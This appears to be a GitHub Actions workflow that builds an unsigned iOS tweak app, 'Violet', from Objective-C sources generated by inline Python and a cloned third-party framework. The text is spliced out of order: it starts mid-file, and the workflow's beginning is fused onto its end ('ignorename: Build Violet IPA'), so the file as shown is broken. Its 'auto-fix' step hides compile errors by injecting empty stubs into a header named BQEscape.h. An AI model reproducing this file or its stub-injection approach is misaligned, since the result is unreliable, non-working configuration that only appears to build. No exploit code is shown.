                          VioletTransport t =
                              [TransportManager sharedManager].activeTransport;
                          self.statusLabel.text =
                              t == VioletTransportAirlift
                                  ? @"✅ Connected via Airlift"
                                  : @"✅ Connected via worse_query";
                      } else {
                          self.statusLabel.text =
                              [NSString stringWithFormat:@"❌ %@",
                               error.localizedDescription];
                      }
                  });
              }];
          }

          @end
          """)

          # ── UI/Tabs/WalletViewController.h ───────────────────────────────
          w("Violet/UI/Tabs/WalletViewController.h", """\
          #pragma once
          #import <UIKit/UIKit.h>

          @interface WalletViewController : UIViewController
          @end
          """)

          # ── UI/Tabs/WalletViewController.m ───────────────────────────────
          w("Violet/UI/Tabs/WalletViewController.m", """\
          #import "WalletViewController.h"

          @implementation WalletViewController

          - (void)viewDidLoad {
              [super viewDidLoad];
              self.title = @"Wallet";
              self.view.backgroundColor =
                  [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];

              UILabel *lbl = [[UILabel alloc] init];
              lbl.text          = @"Wallet & Passcode Themer";
              lbl.textColor     = UIColor.whiteColor;
              lbl.font          = [UIFont boldSystemFontOfSize:20];
              lbl.textAlignment = NSTextAlignmentCenter;
              lbl.numberOfLines = 0;
              lbl.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:lbl];
              [NSLayoutConstraint activateConstraints:@[
                  [lbl.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [lbl.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
                  [lbl.widthAnchor   constraintEqualToAnchor:self.view.widthAnchor
                                                  multiplier:0.8],
              ]];

              UILabel *sub = [[UILabel alloc] init];
              sub.text          = @"Coming soon — airlift write calls will\ntheme your wallet & lock screen.";
              sub.textColor     = UIColor.lightGrayColor;
              sub.font          = [UIFont systemFontOfSize:14];
              sub.textAlignment = NSTextAlignmentCenter;
              sub.numberOfLines = 0;
              sub.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:sub];
              [NSLayoutConstraint activateConstraints:@[
                  [sub.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [sub.topAnchor     constraintEqualToAnchor:lbl.bottomAnchor constant:12],
                  [sub.widthAnchor   constraintEqualToAnchor:self.view.widthAnchor
                                                  multiplier:0.8],
              ]];
          }

          @end
          """)

          # ── UI/Tabs/TerminalViewController.h ─────────────────────────────
          w("Violet/UI/Tabs/TerminalViewController.h", """\
          #pragma once
          #import <UIKit/UIKit.h>

          @interface TerminalViewController : UIViewController
          @end
          """)

          # ── UI/Tabs/TerminalViewController.m ─────────────────────────────
          w("Violet/UI/Tabs/TerminalViewController.m", """\
          #import "TerminalViewController.h"

          @implementation TerminalViewController

          - (void)viewDidLoad {
              [super viewDidLoad];
              self.title = @"Terminal";
              self.view.backgroundColor =
                  [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];

              // Blur lock overlay
              UIBlurEffect *blur =
                  [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemUltraThinMaterialDark];
              UIVisualEffectView *overlay =
                  [[UIVisualEffectView alloc] initWithEffect:blur];
              overlay.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:overlay];
              [NSLayoutConstraint activateConstraints:@[
                  [overlay.topAnchor    constraintEqualToAnchor:self.view.topAnchor],
                  [overlay.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
                  [overlay.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
                  [overlay.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],
              ]];

              UILabel *lbl = [[UILabel alloc] init];
              lbl.text          = @"🔒 Terminal — coming in a future build";
              lbl.textColor     = UIColor.whiteColor;
              lbl.font          = [UIFont boldSystemFontOfSize:18];
              lbl.textAlignment = NSTextAlignmentCenter;
              lbl.numberOfLines = 0;
              lbl.translatesAutoresizingMaskIntoConstraints = NO;
              [overlay.contentView addSubview:lbl];
              [NSLayoutConstraint activateConstraints:@[
                  [lbl.centerXAnchor constraintEqualToAnchor:overlay.contentView.centerXAnchor],
                  [lbl.centerYAnchor constraintEqualToAnchor:overlay.contentView.centerYAnchor],
                  [lbl.widthAnchor   constraintEqualToAnchor:overlay.contentView.widthAnchor
                                                  multiplier:0.8],
              ]];
          }

          @end
          """)

          print("All source files generated.")
          PYEOF

      # ─────────────────────────────────────────────
      # 5. INSTALL XCODEGEN
      # ─────────────────────────────────────────────
      - name: Install xcodegen
        run: brew install xcodegen

      # ─────────────────────────────────────────────
      # 6. WRITE project.yml AND GENERATE .xcodeproj
      # ─────────────────────────────────────────────
      - name: Generate Xcode project
        run: |
          cat > project.yml << 'YMEOF'
          name: Violet
          options:
            bundleIdPrefix: com.violet
            deploymentTarget:
              iOS: "18.0"
            xcodeVersion: "16.4"
            createIntermediateGroups: true

          settings:
            base:
              SWIFT_VERSION: "5.0"
              CODE_SIGNING_ALLOWED: "NO"
              CODE_SIGN_IDENTITY: ""
              CODE_SIGNING_REQUIRED: "NO"
              PRODUCT_BUNDLE_IDENTIFIER: com.violet.app
              INFOPLIST_FILE: Violet/App/Info.plist
              ALWAYS_SEARCH_USER_PATHS: "NO"
              CLANG_ENABLE_MODULES: "YES"
              GCC_PREPROCESSOR_DEFINITIONS: "$(inherited)"
              FRAMEWORK_SEARCH_PATHS: "$(SRCROOT)/Frameworks"
              OTHER_LDFLAGS: "-lc++ -framework Network -framework XPC"

          targets:
            Violet:
              type: application
              platform: iOS
              deploymentTarget: "18.0"
              sources:
                - path: Violet
                  excludes:
                    - "**/*.md"
              entitlements:
                path: Violet/App/Violet.entitlements
              settings:
                base:
                  CODE_SIGNING_ALLOWED: "NO"
                  CODE_SIGN_IDENTITY: ""
                  CODE_SIGNING_REQUIRED: "NO"
                  PRODUCT_BUNDLE_IDENTIFIER: com.violet.app
                  INFOPLIST_FILE: Violet/App/Info.plist
                  FRAMEWORK_SEARCH_PATHS: "$(SRCROOT)/Frameworks"
                  OTHER_LDFLAGS: "-lc++ -framework Network -framework XPC"
              dependencies:
                - framework: Frameworks/AirliftFFI.xcframework
                  embed: false
          YMEOF

          xcodegen generate

      # ─────────────────────────────────────────────
      # 7. BUILD ATTEMPT 1
      # ─────────────────────────────────────────────
      - name: Build attempt 1
        id: build1
        continue-on-error: true
        run: |
          set -o pipefail
          xcodebuild \
            -project Violet.xcodeproj \
            -scheme Violet \
            -configuration Release \
            -sdk iphoneos \
            -arch arm64 \
            CODE_SIGNING_ALLOWED=NO \
            CODE_SIGN_IDENTITY="" \
            CODE_SIGNING_REQUIRED=NO \
            ONLY_ACTIVE_ARCH=NO \
            build 2>&1 | tee build_attempt1.log
          echo "BUILD1_EXIT=${PIPESTATUS[0]}" >> $GITHUB_ENV

      # ─────────────────────────────────────────────
      # 8. AUTO-FIX COMPILE ERRORS
      # ─────────────────────────────────────────────
      - name: Auto-fix compile errors
        if: steps.build1.outcome == 'failure'
        run: |
          python3 - <<'PYEOF'
          import re, os, glob

          log = open("build_attempt1.log").read()
          fixed = []

          # ── Fix 1: NMMutableArray typo ──────────────────────────────────
          for f in glob.glob("Violet/**/*.h", recursive=True) + \
                   glob.glob("Violet/**/*.m", recursive=True):
              src = open(f).read()
              if "NMMutableArray" in src:
                  open(f, "w").write(src.replace("NMMutableArray", "NSMutableArray"))
                  fixed.append(f"NMMutableArray→NSMutableArray in {f}")

          # ── Fix 2: undeclared functions — inject extern declarations ─────
          undecl = re.findall(r"implicit declaration of function '(\w+)'", log)
          if undecl:
              header_path = "Violet/Core/BQEscape.h"
              hdr = open(header_path).read() if os.path.exists(header_path) else ""
              for fn in set(undecl):
                  if fn not in hdr:
                      hdr += f"\nvoid {fn}(void); // auto-injected extern\n"
                      fixed.append(f"extern for {fn} in BQEscape.h")
              open(header_path, "w").write(hdr)

          # ── Fix 3: missing UniformTypeIdentifiers import ─────────────────
          for f in glob.glob("Violet/**/*.m", recursive=True):
              src = open(f).read()
              if "UTType" in src and "UniformTypeIdentifiers" not in src:
                  open(f, "w").write(
                      "#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>\n" + src)
                  fixed.append(f"Added UniformTypeIdentifiers import to {f}")

          # ── Fix 4: use-of-undeclared identifier errors ───────────────────
          ident_errs = re.findall(r"error: use of undeclared identifier '(\w+)'", log)
          if ident_errs:
              for f in glob.glob("Violet/**/*.m", recursive=True):
                  src = open(f).read()
                  for ident in ident_errs:
                      if ident in src:
                          header_path = "Violet/Core/BQEscape.h"
                          hdr = open(header_path).read()
                          if ident not in hdr:
                              hdr += f"\nid {ident}; // auto-injected identifier stub\n"
                              open(header_path, "w").write(hdr)
                              fixed.append(f"stub for {ident} in BQEscape.h")

          if fixed:
              print("Fixes applied:")
              for f in fixed:
                  print(f"  {f}")
          else:
              print("No auto-fixable patterns found.")
          PYEOF

      # ─────────────────────────────────────────────
      # 9. BUILD ATTEMPT 2
      # ─────────────────────────────────────────────
      - name: Build attempt 2
        if: steps.build1.outcome == 'failure'
        id: build2
        continue-on-error: true
        run: |
          set -o pipefail
          xcodebuild \
            -project Violet.xcodeproj \
            -scheme Violet \
            -configuration Release \
            -sdk iphoneos \
            -arch arm64 \
            CODE_SIGNING_ALLOWED=NO \
            CODE_SIGN_IDENTITY="" \
            CODE_SIGNING_REQUIRED=NO \
            ONLY_ACTIVE_ARCH=NO \
            build 2>&1 | tee build_attempt2.log
          echo "BUILD2_EXIT=${PIPESTATUS[0]}" >> $GITHUB_ENV

      # ─────────────────────────────────────────────
      # 10. PACKAGE IPA
      # ─────────────────────────────────────────────
      - name: Package unsigned IPA
        run: |
          # Accept whichever build succeeded
          BUILD_DIR=$(xcodebuild \
            -project Violet.xcodeproj \
            -scheme Violet \
            -configuration Release \
            -sdk iphoneos \
            -showBuildSettings 2>/dev/null | \
            grep " BUILT_PRODUCTS_DIR " | head -1 | awk '{print $3}')

          APP_PATH="$BUILD_DIR/Violet.app"
          if [ ! -d "$APP_PATH" ]; then
            # Fallback search
            APP_PATH=$(find ~/Library/Developer/Xcode/DerivedData \
                        -name "Violet.app" \
                        -path "*/Release-iphoneos/*" 2>/dev/null | head -1)
          fi

          if [ -z "$APP_PATH" ] || [ ! -d "$APP_PATH" ]; then
            echo "ERROR: Violet.app not found — build failed"
            exit 1
          fi

          echo "Packaging $APP_PATH"
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          zip -r Violet-unsigned.ipa Payload
          rm -rf Payload
          echo "IPA created: Violet-unsigned.ipa"

      # ─────────────────────────────────────────────
      # 11. UPLOAD ARTIFACTS
      # ─────────────────────────────────────────────
      - name: Upload IPA
        uses: actions/upload-artifact@v4
        with:
          name: Violet-unsigned-ipa
          path: Violet-unsigned.ipa
          if-no-files-found: error

      - name: Upload build logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-logs
          path: |
            build_attempt1.log
            build_attempt2.log
          if-no-files-found: ignorename: Build Violet IPA

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-15
    timeout-minutes: 60

    steps:
      # ─────────────────────────────────────────────
      # 1. CHECKOUT
      # ─────────────────────────────────────────────
      - name: Checkout repo
        uses: actions/checkout@v4

      # ─────────────────────────────────────────────
      # 2. SELECT XCODE 16.4
      # ─────────────────────────────────────────────
      - name: Select Xcode 16.4
        run: sudo xcode-select -s /Applications/Xcode_16.4.app/Contents/Developer

      # ─────────────────────────────────────────────
      # 3. FETCH AirliftFFI.xcframework FROM AirCard-iOS
      # ─────────────────────────────────────────────
      - name: Clone AirCard-iOS and extract AirliftFFI
        run: |
          git clone --depth 1 https://github.com/Mak5er/AirCard-iOS.git /tmp/AirCard-iOS
          # Try common locations for the xcframework
          XCFW=""
          for candidate in \
            "/tmp/AirCard-iOS/AirliftFFI.xcframework" \
            "/tmp/AirCard-iOS/Frameworks/AirliftFFI.xcframework" \
            "/tmp/AirCard-iOS/libs/AirliftFFI.xcframework"; do
            if [ -d "$candidate" ]; then
              XCFW="$candidate"
              break
            fi
          done
          if [ -z "$XCFW" ]; then
            # Fallback: find it anywhere in the repo
            XCFW=$(find /tmp/AirCard-iOS -name "AirliftFFI.xcframework" -maxdepth 6 | head -1)
          fi
          if [ -z "$XCFW" ]; then
            echo "ERROR: AirliftFFI.xcframework not found in AirCard-iOS repo"
            find /tmp/AirCard-iOS -type d | head -40
            exit 1
          fi
          echo "Found xcframework at: $XCFW"
          mkdir -p Frameworks
          cp -R "$XCFW" Frameworks/AirliftFFI.xcframework
          echo "AirliftFFI.xcframework copied to Frameworks/"

      # ─────────────────────────────────────────────
      # 4. GENERATE ALL SOURCE FILES (inline Python)
      # ─────────────────────────────────────────────
      - name: Generate Violet source files
        run: |
          python3 - <<'PYEOF'
          import os

          def w(path, content):
              os.makedirs(os.path.dirname(path), exist_ok=True)
              with open(path, 'w') as f:
                  f.write(content)
              print(f"  wrote {path}")

          # ── App/main.m ──────────────────────────────────────────────────
          w("Violet/App/main.m", """\
          #import <UIKit/UIKit.h>
          #import "AppDelegate.h"

          int main(int argc, char * argv[]) {
              NSString * appDelegateClassName;
              @autoreleasepool {
                  appDelegateClassName = NSStringFromClass([AppDelegate class]);
              }
              return UIApplicationMain(argc, argv, nil, appDelegateClassName);
          }
          """)

          # ── App/AppDelegate.h ───────────────────────────────────────────
          w("Violet/App/AppDelegate.h", """\
          #import <UIKit/UIKit.h>

          @interface AppDelegate : UIResponder <UIApplicationDelegate>
          @property (strong, nonatomic) UIWindow *window;
          @end
          """)

          # ── App/AppDelegate.m ───────────────────────────────────────────
          w("Violet/App/AppDelegate.m", """\
          #import "AppDelegate.h"
          #import "RootTabBarController.h"

          @implementation AppDelegate

          - (BOOL)application:(UIApplication *)application
              didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
              self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
